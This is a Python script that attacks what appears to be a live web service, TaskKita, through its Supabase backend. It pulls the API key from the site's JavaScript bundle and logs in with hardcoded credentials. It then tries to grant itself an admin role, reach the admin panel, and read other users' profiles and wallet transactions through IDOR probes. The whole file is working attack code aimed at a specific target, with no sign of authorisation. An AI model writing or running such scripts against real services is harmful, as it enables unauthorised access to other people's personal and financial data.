#!/usr/bin/env python3
"""Try privilege escalation on TaskKita Supabase."""
import urllib.request, json, re, http.client

SUPABASE_URL = "https://xvdibouzxfynsxgrmffb.supabase.co"
EMAIL = "taskkita.test.7788@web-library.net"
PASSWORD = "TestPass789!"

# Get anon key
req = urllib.request.Request("https://taskkita.com/assets/index-CdJ2nOzM.js",
    headers={"User-Agent": "Mozilla/5.0"})
resp = urllib.request.urlopen(req, timeout=15)
keys = re.findall(r'["\x27](eyJ[a-zA-Z0-9_-]+[.][a-zA-Z0-9_-]+[.][a-zA-Z0-9_-]+)["\x27]',
    resp.read().decode(errors="replace"))
SUPABASE_KEY = keys[0]

# Login
conn = http.client.HTTPSConnection("xvdibouzxfynsxgrmffb.supabase.co")
payload = json.dumps({"email": EMAIL, "password": PASSWORD})
headers = {"Content-Type": "application/json", "apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}"}
conn.request("POST", "/auth/v1/token?grant_type=password", body=payload, headers=headers)
body = json.loads(conn.getresponse().read().decode())
conn.close()
access_token = body.get("access_token", "")
user_id = body.get("user", {}).get("id", "")

headers = {
    "Content-Type": "application/json",
    "apikey": SUPABASE_KEY,
    "Authorization": f"Bearer {access_token}",
    "Accept": "application/json",
    "Prefer": "return=representation",
}

print(f"User ID: {user_id}")

# 1. Try to update our role to admin
print("\n=== TRYING PRIVILEGE ESCALATION ===")
try:
    conn = http.client.HTTPSConnection("xvdibouzxfynsxgrmffb.supabase.co")
    payload = json.dumps({"role": "admin"})
    conn.request("PATCH", f"/rest/v1/user_roles?user_id=eq.{user_id}", body=payload, headers=headers)
    r = conn.getresponse()
    body = r.read().decode()
    print(f"PATCH user_roles: {r.status} - {body[:200]}")
    conn.close()
except Exception as e:
    print(f"PATCH error: {e}")

# 2. Try to insert a new admin role
try:
    conn = http.client.HTTPSConnection("xvdibouzxfynsxgrmffb.supabase.co")
    payload = json.dumps({"user_id": user_id, "role": "admin"})
    conn.request("POST", "/rest/v1/user_roles", body=payload, headers=headers)
    r = conn.getresponse()
    body = r.read().decode()
    print(f"POST user_roles: {r.status} - {body[:200]}")
    conn.close()
except Exception as e:
    print(f"POST error: {e}")

# 3. Try to access the admin page with our session
print("\n=== ACCESSING ADMIN PANEL ===")
conn = http.client.HTTPSConnection("taskkita.com")
conn.request("GET", "/admin", headers={
    "User-Agent": "Mozilla/5.0",
    "Cookie": f"sb-auth-token={access_token}"
})
r = conn.getresponse()
html = r.read().decode(errors="replace")
conn.close()

if "admin" in html.lower() and "log masuk" in html.lower():
    print("Admin page shows login form - not authenticated as admin")
elif "dashboard" in html.lower() or "panel" in html.lower():
    print("POSSIBLE ADMIN ACCESS!")

# 4. Try to query all profiles (IDOR test)
print("\n=== TESTING IDOR ON PROFILES ===")
try:
    # Try with different select patterns
    conn = http.client.HTTPSConnection("xvdibouzxfynsxgrmffb.supabase.co")
    # Try without RLS bypass (id=ne.{our_id})
    conn.request("GET", "/rest/v1/profiles?select=*&limit=10", headers=headers)
    r = conn.getresponse()
    body = r.read().decode()
    records = json.loads(body) if body.strip() else []
    print(f"All profiles ({len(records)} records): {body[:300]}")
    conn.close()
except Exception as e:
    print(f"IDOR error: {e}")

# 5. Check if we can see other user's data by ID
print("\n=== TRYING OTHER USER IDS ===")
for try_id in ["00000000-0000-0000-0000-000000000001", "00000000-0000-0000-0000-000000000002"]:
    try:
        conn = http.client.HTTPSConnection("xvdibouzxfynsxgrmffb.supabase.co")
        conn.request("GET", f"/rest/v1/profiles?id=eq.{try_id}", headers=headers)
        r = conn.getresponse()
        body = r.read().decode()
        conn.close()
        if r.status == 200 and len(body) > 10:
            print(f"Found data for {try_id}: {body[:200]}")
    except:
        pass

# 6. Check wallet_transactions more carefully
print("\n=== WALLET TRANSACTIONS ===")
try:
    conn = http.client.HTTPSConnection("xvdibouzxfynsxgrmffb.supabase.co")
    conn.request("GET", "/rest/v1/wallet_transactions?select=*&limit=10&order=created_at.desc", headers=headers)
    r = conn.getresponse()
    body = r.read().decode()
    print(f"Status: {r.status}, Body: {body[:200]}")
    conn.close()
except Exception as e:
    print(f"Error: {e}")
